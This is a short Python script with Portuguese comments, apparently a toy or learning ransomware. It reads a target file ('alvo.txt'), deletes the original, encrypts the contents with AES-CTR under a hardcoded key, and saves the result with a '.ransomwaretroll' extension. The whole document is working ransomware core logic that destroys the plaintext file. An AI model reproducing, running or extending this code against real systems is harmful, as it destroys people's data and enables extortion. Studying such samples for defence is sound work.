## IMPORTANDO BIBLIOTECAS
import os
import pyaes

## ABRINDO ARQUIVO A SER CRIPTOGRAFADO
nome_arquivo = "alvo.txt"           ## COLETA O NOME DO ARQUIVO
arquivo = open(nome_arquivo, "rb")  ## ABRIMOS O ARQUIVO NUMA VARIÁVEL
dados_arquivo = arquivo.read()      ## COLETAMOS O CONTEÚDO
arquivo.close                       ## FECHAMOS O ARQUIVO

## DESTRUINDO O ARQUIVO ORIGINAL
os.remove(nome_arquivo)

## CHAVE DE CRIPTOGRAFIA
chave = b"exponencialmente"
aes = pyaes.AESModeOfOperationCTR(chave)    ## USAMOS UMA FUNÇÃO QUE FAZ A CRIPTOGRAFIA

## CRIPTOGRAFANDO O ARQUIVO
dados_cripto = aes.encrypt(dados_arquivo)

## SALVANDO O ARQUIVO CRIPTOGRAFADO
novo_arquivo = nome_arquivo + ".ransomwaretroll"    ## CRIAMOS O NOME
novo_arquivo = open(f"{novo_arquivo}", "wb")        ## ABRIMOS O ARQUIVO
novo_arquivo.write(dados_cripto)                    ## COLOCAMOS OS DADOS CRIPTOGRAFADOS
novo_arquivo.close()                                ## FECHAMOS